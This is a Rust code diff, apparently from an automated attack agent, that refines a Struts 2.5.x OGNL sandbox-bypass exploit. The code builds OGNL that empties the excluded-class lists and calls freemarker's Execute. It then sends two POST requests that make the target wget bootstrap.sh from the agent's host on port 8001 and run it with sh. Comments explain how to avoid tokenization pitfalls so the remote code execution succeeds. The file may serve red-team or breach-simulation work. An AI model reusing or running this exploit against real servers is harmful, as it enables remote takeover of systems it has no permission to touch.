@@ -1294,29 +1294,49 @@ fn ssh_opts(key_path: Option<&Path>) -> Vec<String> {
 /// Substitutions performed:
 ///   `<source_ip>` → the agent's own IP address (used in wget/curl URLs)
 ///   `__struts_bypass__` → the full URL-encoded Struts 2.5.x SecurityMemberAccess bypass OGNL
-///     expression that downloads and executes bootstrap.sh via freemarker.Execute.
+///     that downloads and executes bootstrap.sh via freemarker.Execute.
+///     Internally expanded to TWO requests (wget step then sh step) by execute_step.
 fn resolve_http_path(path: &str, source_ip: Option<Ipv4Addr>) -> String {
     let ip_str = source_ip.map(|ip| ip.to_string()).unwrap_or_default();
     let path = path.replace("<source_ip>", &ip_str);
+    path
+}
 
-    if path.contains("__struts_bypass__") && !ip_str.is_empty() {
-        let cmd = format!(
-            "wget -q http://{}:8001/bootstrap.sh -O /tmp/bootstrap.sh ; sh /tmp/bootstrap.sh",
-            ip_str
-        );
-        let encoded_ognl = build_struts_bypass_ognl(&cmd);
-        path.replace("__struts_bypass__", &encoded_ognl)
-    } else {
-        path
+/// Expand `__struts_bypass__` to the wget-only OGNL URL (step 1 of 2).
+/// freemarker.Execute concatenates arglist to a single string for Runtime.exec(String),
+/// so the command must be a single space-separated token string with no shell operators.
+fn resolve_struts_wget(path: &str, source_ip: Option<Ipv4Addr>) -> Option<String> {
+    let ip_str = source_ip.map(|ip| ip.to_string())?;
+    if !path.contains("__struts_bypass__") || ip_str.is_empty() {
+        return None;
     }
+    let cmd = format!(
+        "wget -q http://{}:8001/bootstrap.sh -O /tmp/bootstrap.sh",
+        ip_str
+    );
+    let encoded_ognl = build_struts_bypass_ognl(&cmd);
+    Some(path.replace("__struts_bypass__", &encoded_ognl))
+}
+
+/// Expand `__struts_bypass__` to the sh-only OGNL URL (step 2 of 2).
+fn resolve_struts_sh(path: &str) -> Option<String> {
+    if !path.contains("__struts_bypass__") {
+        return None;
+    }
+    let cmd = "sh /tmp/bootstrap.sh";
+    let encoded_ognl = build_struts_bypass_ognl(cmd);
+    Some(path.replace("__struts_bypass__", &encoded_ognl))
 }
 
 /// Construct the Struts 2.5.x SecurityMemberAccess bypass OGNL expression URL-encoded
 /// for embedding in a `?id=` query parameter.
 ///
-/// Uses the org.apache.tomcat.InstanceManager to instantiate classes outside the
-/// restricted package list, then calls freemarker.template.utility.Execute.exec()
-/// with ["bash", "-c", cmd] to run arbitrary shell commands.
+/// freemarker.Execute.exec(list) concatenates all list elements into a single string and
+/// passes it to Runtime.exec(String) which tokenizes by whitespace. Therefore `cmd` must
+/// be a single tokenizable string (e.g. "wget -q http://... -O /tmp/file" or "sh /tmp/file").
+/// Do NOT use "bash -c <cmd>" — the shell command gets split off as bash's $0, not the script.
+///
+/// Called twice for the Struts S2-bypass: once with the wget command, once with sh.
 fn build_struts_bypass_ognl(cmd: &str) -> String {
     let ognl = format!(
         concat!(
@@ -1332,8 +1352,6 @@ fn build_struts_bypass_ognl(cmd: &str) -> String {
             r#".(#bean.put("excludedClasses",#emptyset))"#,
             r#".(#bean.put("excludedPackageNames",#emptyset))"#,
             r#".(#arglist=#instancemanager.newInstance("java.util.ArrayList"))"#,
-            r#".(#arglist.add("bash"))"#,
-            r#".(#arglist.add("-c"))"#,
             r#".(#arglist.add("{cmd}"))"#,
             r#".(#execute=#instancemanager.newInstance("freemarker.template.utility.Execute"))"#,
             r#".(#execute.exec(#arglist))"#,
@@ -1394,7 +1412,52 @@ async fn execute_step(
             accept_any_response,
         } => {
             let p = port.unwrap_or(80);
-            // Resolve path: substitute <source_ip> and expand __struts_bypass__ sentinel.
+
+            // __struts_bypass__ expands to TWO sequential requests: wget then sh.
+            // freemarker.Execute.exec() concatenates list elements then calls Runtime.exec(String)
+            // which tokenizes by whitespace — so each request must be a single-element command
+            // (no shell, no "bash -c") to work correctly.
+            if let (Some(wget_path), Some(sh_path)) = (
+                resolve_struts_wget(path, source_ip),
+                resolve_struts_sh(path),
+            ) {
+                let client = reqwest::Client::new();
+
+                // Step A: wget bootstrap.sh
+                let wget_url = format!("http://{}:{}{}", target, p, wget_path);
+                tracing::info!(%wget_url, "HTTP POST [struts-bypass wget]");
+                let mut wget_req = client.post(&wget_url).body(body.clone());
+                for (k, v) in headers {
+                    wget_req = wget_req.header(k.as_str(), v.as_str());
+                }
+                match timeout(Duration::from_millis(timeout_ms), wget_req.send()).await {
+                    Ok(Ok(r)) if r.status().is_success() || *accept_any_response => {
+                        tracing::info!(status = r.status().as_u16(), "HTTP POST wget completed");
+                    }
+                    Ok(Ok(r)) => return StepResult::Failed(format!("HTTP {}", r.status())),
+                    Ok(Err(e)) => return StepResult::Failed(e.to_string()),
+                    Err(_) => return StepResult::Failed("timeout".into()),
+                }
+
+                // Step B: sh /tmp/bootstrap.sh (Execute.exec() blocks until sh exits)
+                let sh_url = format!("http://{}:{}{}", target, p, sh_path);
+                tracing::info!(%sh_url, "HTTP POST [struts-bypass sh]");
+                let mut sh_req = client.post(&sh_url).body(body.clone());
+                for (k, v) in headers {
+                    sh_req = sh_req.header(k.as_str(), v.as_str());
+                }
+                return match timeout(Duration::from_millis(timeout_ms), sh_req.send()).await {
+                    Ok(Ok(r)) if r.status().is_success() || *accept_any_response => {
+                        tracing::info!(status = r.status().as_u16(), "HTTP POST sh completed");
+                        StepResult::Ok
+                    }
+                    Ok(Ok(r)) => StepResult::Failed(format!("HTTP {}", r.status())),
+                    Ok(Err(e)) => StepResult::Failed(e.to_string()),
+                    Err(_) => StepResult::Failed("timeout".into()),
+                };
+            }
+
+            // Normal (non-Struts) HTTP POST path.
             let resolved_path = resolve_http_path(path, source_ip);
             let url = format!("http://{}:{}{}", target, p, resolved_path);
             tracing::info!(%url, custom_headers = headers.len(), accept_any = accept_any_response, "HTTP POST");
